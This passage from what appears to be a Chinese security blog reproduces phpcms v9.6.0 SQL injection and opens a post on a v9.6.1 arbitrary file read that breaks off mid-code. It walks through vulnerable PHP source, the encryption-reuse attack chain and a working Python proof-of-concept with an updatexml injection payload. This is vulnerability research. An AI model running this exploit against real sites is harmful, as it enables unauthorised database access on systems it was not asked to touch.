class="subst">$font</span> `<span class="subst">$key</span>` = &#x27;<span class="subst">$val</span>&#x27; &quot;</span> : <span class="string">&quot; `<span class="subst">$key</span>` = &#x27;<span class="subst">$val</span>&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$where</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_one</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$table</span>, <span class="variable">$where</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$order</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$group</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$where</span> = <span class="variable">$where</span> == <span class="string">&#x27;&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; WHERE &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line">		<span class="variable">$order</span> = <span class="variable">$order</span> == <span class="string">&#x27;&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; ORDER BY &#x27;</span>.<span class="variable">$order</span>;</span><br><span class="line">		<span class="variable">$group</span> = <span class="variable">$group</span> == <span class="string">&#x27;&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27; GROUP BY &#x27;</span>.<span class="variable">$group</span>;</span><br><span class="line">		<span class="variable">$limit</span> = <span class="string">&#x27; LIMIT 1&#x27;</span>;</span><br><span class="line">		<span class="variable">$field</span> = explode( <span class="string">&#x27;,&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">		array_walk(<span class="variable">$field</span>, <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">&#x27;add_special_char&#x27;</span>));</span><br><span class="line">		<span class="variable">$data</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$field</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&#x27;SELECT &#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27; FROM `&#x27;</span>.<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;database&#x27;</span>].<span class="string">&#x27;`.`&#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27;`&#x27;</span>.<span class="variable">$where</span>.<span class="variable">$group</span>.<span class="variable">$order</span>.<span class="variable">$limit</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;fetch_next();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;free_result();</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>没有对解密后的id进行任何过滤</p>
<p>接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句</p>
<p>我们利用<code> set_cookie</code>来生成加密数据</p>
<p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p>
<p>查找调用<code>set_cookie</code>且值<code>$value</code>可控的位置</p>
<p><code>phpcms/modules/attachment/attachments.php</code> 文件的 <code>swfupload_json</code> 方法有满足我们需要的代码。(菜鸡直接看别人找到的)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;aid&#x27;</span>] = intval(<span class="variable">$_GET</span>[<span class="string">&#x27;aid&#x27;</span>]);</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;src&#x27;</span>] = safe_replace(trim(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]));</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;filename&#x27;</span>] = urlencode(safe_replace(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]));</span><br><span class="line">		<span class="variable">$json_str</span> = json_encode(<span class="variable">$arr</span>);</span><br><span class="line">		<span class="variable">$att_arr_exist</span> = param::get_cookie(<span class="string">&#x27;att_json&#x27;</span>);</span><br><span class="line">		<span class="variable">$att_arr_exist_tmp</span> = explode(<span class="string">&#x27;||&#x27;</span>, <span class="variable">$att_arr_exist</span>);</span><br><span class="line">		<span class="keyword">if</span>(is_array(<span class="variable">$att_arr_exist_tmp</span>) &amp;&amp; in_array(<span class="variable">$json_str</span>, <span class="variable">$att_arr_exist_tmp</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$json_str</span> = <span class="variable">$att_arr_exist</span> ? <span class="variable">$att_arr_exist</span>.<span class="string">&#x27;||&#x27;</span>.<span class="variable">$json_str</span> : <span class="variable">$json_str</span>;</span><br><span class="line">			param::set_cookie(<span class="string">&#x27;att_json&#x27;</span>,<span class="variable">$json_str</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,跟进<code>safe_replace</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="variable">$string</span> = str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然这里单引号被过滤了,但是前面是用<code>parse_str($a_k);</code>来恢复变量的,我们可以利用<code>safe_replace</code>能将某些字符替换为空格用url编码来绕过黑名单</p>
<p>但是在调用<code>swfupload_json</code> 前,它还会调用<code>__construct</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		pc_base::load_app_func(<span class="string">&#x27;global&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload_url = pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_url&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload_path = pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_path&#x27;</span>);		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;imgext = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;userid = <span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>] ? <span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>] : (param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) ? param::get_cookie(<span class="string">&#x27;_userid&#x27;</span>) : sys_auth(<span class="variable">$_POST</span>[<span class="string">&#x27;userid_flash&#x27;</span>],<span class="string">&#x27;DECODE&#x27;</span>));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;isadmin = <span class="keyword">$this</span>-&gt;admin_username = <span class="variable">$_SESSION</span>[<span class="string">&#x27;roleid&#x27;</span>] ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;groupid = param::get_cookie(<span class="string">&#x27;_groupid&#x27;</span>) ? param::get_cookie(<span class="string">&#x27;_groupid&#x27;</span>) : <span class="number">8</span>;</span><br><span class="line">		<span class="comment">//判断是否登录</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;userid))&#123;</span><br><span class="line">			showmessage(L(<span class="string">&#x27;please_login&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;member&#x27;</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要用<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>来生成<code>$this-&gt;userid</code>,来绕过死亡exit</p>
<p>这次我们还需要找一个地方来生成<code>userid</code>,但是限制更少了,只要<code>$this-&gt;userid</code>不为空即可</p>
<p> 我们可以搜到 <code>phpcms/modules/wap/index.php</code> 文件，在该文件中 <code>$_GET[&#39;siteid&#39;]</code> 可控，并且可以通过 <strong>cookie</strong> 获得加密后的数据,虽然有intval来过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">&#x27;content_model&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;siteid&#x27;</span>]) &amp;&amp; (intval(<span class="variable">$_GET</span>[<span class="string">&#x27;siteid&#x27;</span>]) &gt; <span class="number">0</span>) ? intval(trim(<span class="variable">$_GET</span>[<span class="string">&#x27;siteid&#x27;</span>])) : (param::get_cookie(<span class="string">&#x27;siteid&#x27;</span>) ? param::get_cookie(<span class="string">&#x27;siteid&#x27;</span>) : <span class="number">1</span>);</span><br><span class="line">		param::set_cookie(<span class="string">&#x27;siteid&#x27;</span>,<span class="keyword">$this</span>-&gt;siteid);	</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap_site = getcache(<span class="string">&#x27;wap_site&#x27;</span>,<span class="string">&#x27;wap&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;types = getcache(<span class="string">&#x27;wap_type&#x27;</span>,<span class="string">&#x27;wap&#x27;</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap = <span class="keyword">$this</span>-&gt;wap_site[<span class="keyword">$this</span>-&gt;siteid];</span><br><span class="line">		define(<span class="string">&#x27;WAP_SITEURL&#x27;</span>, <span class="keyword">$this</span>-&gt;wap[<span class="string">&#x27;domain&#x27;</span>] ? <span class="keyword">$this</span>-&gt;wap[<span class="string">&#x27;domain&#x27;</span>].<span class="string">&#x27;index.php?&#x27;</span> : APP_PATH.<span class="string">&#x27;index.php?m=wap&amp;siteid=&#x27;</span>.<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;wap[<span class="string">&#x27;status&#x27;</span>]!=<span class="number">1</span>) <span class="keyword">exit</span>(L(<span class="string">&#x27;wap_close_status&#x27;</span>));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>于是整个攻击链便完整了</p>
<p>先利用wap来获得<code>userid</code></p>
<p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p>
<p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p>
<p>再利用attachment来获得加密的恶意sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(看poc吧)</span><br><span class="line">post:</span><br><span class="line">userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</span><br></pre></td></tr></table></figure>



<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url,proxies=&#123;&#125;</span>):</span></span><br><span class="line">    sess=requests.session()</span><br><span class="line">    sess.get(<span class="string">&quot;%s/index.php?m=wap&amp;siteid=1&quot;</span>%url)</span><br><span class="line">    sess.proxies=proxies</span><br><span class="line">    pre=<span class="built_in">list</span>(sess.cookies.get_dict())[<span class="number">0</span>][:<span class="number">5</span>]+<span class="string">&quot;_&quot;</span></span><br><span class="line">    userid=sess.cookies.get_dict()[pre+<span class="string">&quot;siteid&quot;</span>]</span><br><span class="line">    param=&#123;</span><br><span class="line">        <span class="string">&quot;m&quot;</span>:<span class="string">&quot;attachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;c&quot;</span>:<span class="string">&quot;attachments&quot;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>:<span class="string">&quot;swfupload_json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;src&quot;</span>:<span class="string">&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(<span class="string">&quot;%s/index.php&quot;</span>%url,params=param,data=&#123;<span class="string">&quot;userid_flash&quot;</span>:userid&#125;)</span><br><span class="line">    a_k=sess.cookies.get_dict()[pre+<span class="string">&quot;att_json&quot;</span>]</span><br><span class="line">    result=sess.get(<span class="string">&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;</span>%(url,a_k)).text</span><br><span class="line">    <span class="comment">#print(userid,a_k)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;XPATH syntax error&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#,&#123;&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(poc(<span class="string">&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;</span>))</span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="cku89gxv4005ewvos4r7984hv" data-title="phpcmsv9.6.0SQL注入" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-phpcmsv9.6.1任意文件读取" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">phpcmsv9.6.1任意文件读取</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-1任意文件读取"><a href="#phpcmsv9-6-1任意文件读取" class="headerlink" title="phpcmsv9.6.1任意文件读取"></a>phpcmsv9.6.1任意文件读取</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置: <code>phpcms/modules/content/down.php</code> 。在该文件的 <code>download</code> 方法中最后一行调用了 <code>file_down</code> 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$a_k</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;a_k&#x27;</span>]);</span><br><span class="line">	<span class="variable">$pc_auth_key</span> = md5(pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;auth_key&#x27;</span>).<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="string">&#x27;down&#x27;</span>);</span><br><span class="line">	<span class="variable">$a_k</span> = sys_auth(<span class="variable">$a_k</span>, <span class="string">&#x27;DECODE&#x27;</span>, <span class="variable">$pc_auth_key</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a_k</span>)) showmessage(L(<span class="string">&#x27;illegal_parameters&#x27;</span>));</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$i</span>,<span class="variable">$m</span>,<span class="variable">$f</span>,<span class="variable">$t</span>,<span class="variable">$ip</span>);</span><br><span class="line">	parse_str(<span class="variable">$a_k</span>);		</span><br><span class="line">	...</span><br><span class="line">	<span class="variable">$starttime</span> = intval(<span class="variable">$t</span>);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#x27;</span>,<span class="variable">$f</span>) || strpos(<span class="variable">$f</span>, <span class="string">&quot;:\\&quot;</span>)!==<span class="literal">FALSE</span> || strpos(<span class="variable">$f</span>,<span class="string">&#x27;..&#x27;</span>)!==<span class="literal">FALSE</span>) showmessage(L(<span class="string">&#x27;url_error&#x27;</span>));</span><br><span class="line">	<span class="variable">$fileurl</span> = trim(<span class="variable">$f</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$downid</span> || <span class="keyword">empty</span>(<span class="variable">$fileurl</span>) || !preg_match(<span class="string">&quot;/[0-9]&#123;10&#125;/&quot;</span>, <span class="variable">$starttime</span>) || !preg_match(<span class="string">&quot;/[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;/&quot;</span>, <span class="variable">$ip</span>) || <span class="variable">$ip</span> != ip()) showmessage(L(<span class="string">&#x27;illegal_parameters&#x27;</span>));	</span><br><span class="line">	<span class="variable">$endtime</span> = SYS_TIME - <span class="variable">$starttime</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$endtime</span> &gt; <span class="number">3600</span>) showmessage(L(<span class="string">&#x27;url_invalid&#x27;</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$m</span>) <span class="variable">$fileurl</span> = trim(<span class="variable">$s</span>).trim(<span class="variable">$fileurl</span>);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#x27;</span>,<span class="variable">$fileurl</span>) ) showmessage(L(<span class="string">&#x27;url_error&#x27;</span>));</span><br><span class="line">	<span class="comment">//远程文件</span></span><br><span class="line">	<span class="keyword">if</span>(strpos(<span class="variable">$fileurl</span>, <span class="string">&#x27;:/&#x27;</span>) &amp;&amp; (strpos(<span class="variable">$fileurl</span>, pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_url&#x27;</span>)) === <span class="literal">false</span>)) &#123; </span><br><span class="line">		header(<span class="string">&quot;Location: <span class="subst">$fileurl</span>&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$d</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			header(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$fileurl</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$fileurl</span> = str_replace(<span class="keyword">array</span>(pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_url&#x27;</span>),<span class="string">&#x27;/&#x27;</span>), <span class="keyword">array</span>(pc_base::load_config(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_path&#x27;</span>),DIRECTORY_SEPARATOR), <span class="variable">$fileurl</span>);</span><br><span class="line">			<span class="variable">$filename</span> = basename(<span class="variable">$fileurl</span>);</span><br><span class="line">			<span class="comment">//处理中文文件</span></span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;</span>, <span class="variable">$fileurl</span>)) &#123;</span><br><span class="line">				<span class="variable">$filename</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;%5C&quot;</span>, <span class="string">&quot;%2F&quot;</span>, <span class="string">&quot;%3A&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;:&quot;</span>), urlencode(<span class="variable">$fileurl</span>));</span><br><span class="line">				<span class="variable">$filename</span> = urldecode(basename(<span class="variable">$filename</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$ext</span> = fileext(<span class="variable">$filename</span>);</span><br><span class="line">			<span class="variable">$filename</span> = date(<span class="string">&#x27;Ymd_his&#x27;</span>).random(<span class="number">3</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>;</span><br><span class="line">               <span class="variable">$fileurl</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$fileurl</span>);</span><br><span class="line">			file_down(<span class="variable">$fileurl</span>, <span class="variable">$filename</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们跟进<code>file_down</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_down</span>(<span class="params"><span class="variable">$filepath</span>, <span class="variable">$filename</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$filename</span>) <span class="variable">$filename</span> = basename(<span class="variable">$filepath</span>);</span><br><span class="line">	<span class="keyword">if</span>(is_ie()) <span class="variable">$filename</span> = rawurlencode(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$filetype</span> = fileext(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$filesize</span> = sprintf(<span class="string">&quot;%u&quot;</span>, filesize(<span class="variable">$filepath</span>));</span><br><span class="line">	<span 